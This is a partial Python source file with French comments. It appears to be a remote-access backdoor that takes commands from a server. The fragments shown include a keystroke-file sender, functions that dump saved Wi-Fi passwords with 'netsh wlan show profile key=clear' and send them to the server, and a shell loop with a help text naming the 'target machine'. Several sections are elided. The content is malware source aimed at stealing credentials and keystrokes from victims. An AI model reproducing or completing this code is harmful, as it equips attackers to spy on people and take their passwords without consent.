...
def send_keystrokes_file():
    try:
        time.sleep(2)  # Delai pour s'assurer que le fichier est bien ecrit
...
def get_wifi_profiles():
    try:
        process = subprocess.Popen(['netsh', 'wlan', 'show', 'profiles'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        output, _ = process.communicate()
        profiles = [line.split(":")[1].strip() for line in output.splitlines() if "Profil Tous les utilisateurs" in line or "All User Profile" in line]
        return profiles
    except Exception as e:
        sending(f"Error fetching WiFi profiles: {e}")
        return []

def get_wifi_password(profile):
    try:
        process = subprocess.Popen(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        output, _ = process.communicate()
        password_line = None
        ...
        if password_line:
            ...
            return password if password else "No Password Found"
        return "No Password Found"
    except Exception as e:
        return f"Failed to retrieve password: {e}"

def wifi_passwords_handler():
    profiles = get_wifi_profiles()
    if not profiles:
        sending("No WiFi profiles found.")
        return
    ...
    # Envoyer les mots de passe au serveur
    sending({"status": "success", "data": wifi_passwords})
...
def shell():
    while True:
        try:
            ...
            elif command.strip() == "wifi-passwords":
                wifi_passwords_handler()  # Appeler la fonction de recuperation des mots de passe Wi-Fi
                continue
"""
...
def show_help():
    ...
    (windows)wifi-passwords   : Afficher les profils Wi-Fi et leurs mots de passe sur la machine cible.
